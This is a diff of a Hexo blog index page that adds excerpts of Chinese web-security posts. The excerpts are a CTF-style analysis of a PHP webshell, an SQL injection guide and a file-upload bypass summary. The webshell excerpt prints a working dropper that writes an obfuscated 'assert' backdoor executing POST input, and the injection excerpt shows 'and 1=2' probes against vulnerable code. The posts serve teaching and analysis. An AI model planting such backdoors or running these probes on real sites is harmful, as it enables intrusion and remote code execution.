@@ -98,7 +98,7 @@
     <div class="view intro-2" id="background"
          style="background: url('/img/bg1.png')no-repeat center center;
            background-size: cover;
-           background-attachment: fixed;">
+           background-attachment: scroll;">
       <div class="full-bg-img">
         <div class="mask rgba-black-light flex-center">
           <div class="container text-center white-text fadeInUp">
@@ -134,35 +134,40 @@
     
     
     <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/11/27/hello-world/">
-        <p class="h4 index-header">Hello World</p>
+      <a href="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">
+        <p class="h4 index-header">PHP恶意代码分析</p>
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick StartCreate a new post1$ hexo new "My New Post"
+          <div class="index-text mb-1">墨者学院–WebShell代码分析溯源(第11题)
+&lt;?php if(!empty($_GET[1]) &amp;&amp; $_GET[1]=='GET.fPZ87') 	&#123; 		$_=@fopen('t.php', 'a'); 		@fwrite($_,"&lt;?php \$_=str_replace('ilo','ass',str_replace('vey','ert',\$_GET[2]));@\$_(\$_POST[1]);?&gt;"); 		 		@fclose($_);&#125;?&gt;
 
-More info: Writing
-Run server1$ hexo server
-
-More info: Server
-Generate static files1$ hexo generate
-
-More info: Generating
-Deploy to remote sites1$ hexo deploy
-
-More info: Deployment
-</div>
+程序分析
+if(!empty($_GET[1]) &amp;&amp; $_GET[1]=='GET.fPZ87')    //判断通过GET方式参数1是否为空 且 参数值是否为 GET.fPZ87    $_= @fopen('t.php','a');// 打开一个新文件 t.php ,模式 a 为写入内容不覆盖//分析构造的一句话&lt;?php              \$_=str_replace('ilo','ass',str_replace('ve</div>
         </div>
       </a>
 
       <div>
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-11-27&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-11-28&nbsp;&nbsp;
         
         
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">php代码审计</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/php">php</a>&nbsp;
+          
+            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a>&nbsp;
+          
+            <a href="/tags/web%E5%AE%89%E5%85%A8">web安全</a>&nbsp;
+          
         
       </div>
     </div>
@@ -172,36 +177,96 @@ More info: Deployment
     
     
     <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/11/27/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/">
-        <p class="h4 index-header">第一篇文章</p>
+      <a href="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/">
+        <p class="h4 index-header">mysql注入漏洞方法及原理整理</p>
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">123
-123123
+          <div class="index-text mb-1">数据库注入漏洞类型整理写在开始
+由于不同注入方法确定注入点后的获取相应数据方法相同，这里就统一写在一个地方
+文章内容出现过的函数解释为自己所理解的，并不是最全的函数解释
+最开始的是最详细的也是最基础的，避免重复,后面的只有原理代码和修复方案
+下面说的所有注入他们的注入方法都不是固定的，要根据实际情况进行注入
 
-</div>
+sql注入基础确定注入点在进行黑盒测试的过程中，常用于确定注入点的方法
+
+and 1=2–+#
+
+//对应的后端代码$id = $_GET['id'];$sql = "select * from users where id =$id";
+
+http://localhost/?id=1 属于正常查询 返回正常页面
+http://localhost/?iid=1 and 1=1 返回正常页面
+http://localhost/?id=1 and 1=2 返回错误页面
+对应后端处理代码生成sql语句:select * from admin where id=1;查询失败的sql语句:select * from admin where id =1 and 1=2;
+
+原理解释
+当在sq</div>
         </div>
       </a>
 
       <div>
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-11-27&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-11-28&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
           
-            <a href="/categories/Diary">Diary</a>&nbsp;
+            <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8">数据库安全</a>&nbsp;
           &nbsp;
         
         
           <i class="iconfont icon-tag"></i>
           
-            <a href="/tags/PS3">PS3</a>&nbsp;
+            <a href="/tags/sql%E6%B3%A8%E5%85%A5">sql注入</a>&nbsp;
           
-            <a href="/tags/Games">Games</a>&nbsp;
+            <a href="/tags/mysql">mysql</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/">
+        <p class="h4 index-header">文件上传漏洞类型总结</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">文件上传漏洞类型总结写在开始
+文件上传不同类型有难易之分，简单类型简单处理
+
+文件上传——前端绕过
+前端代码
+
+&lt;script type="text/javascript"&gt;    function checkFile() &#123;        var file = document.getElementsByName('upload_file')[0].value;        if (file == null || file == "") &#123;            alert("请选择要上传的文件!");            return false;        &#125;        //定义允许上传的文件类型        var allow_ext = ".jpg|.png|.gif";        //提取上传文件的类型        var ext_name = file.substring(file.lastIndexOf("."));        //判断上传文件类型是否允许上传        if (allow_ext.i</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-11-28&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E5%90%84%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%94%B6%E9%9B%86%E6%95%B4%E7%90%86">各类漏洞收集整理</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/php">php</a>&nbsp;
+          
+            <a href="/tags/web%E5%AE%89%E5%85%A8">web安全</a>&nbsp;
+          
+            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a>&nbsp;
           
         
       </div>
@@ -251,10 +316,8 @@ More info: Deployment
   
 
   <footer class="mt-5">
-  <div class="text-center py-3">
-    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
-    <i class="iconfont icon-love"></i>
-    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+  <div class="text-center py-3">    
+Welcome to 13l00m'world
     <br>
 
     
@@ -319,7 +382,7 @@ More info: Deployment
   <script src="/lib/prettify/prettify.min.js" ></script>
   <script>
     $(document).ready(function () {
-      $('pre').addClass('prettyprint  linenums');
+      $('pre').addClass('prettyprint  ');
       prettyPrint();
     })
   </script>
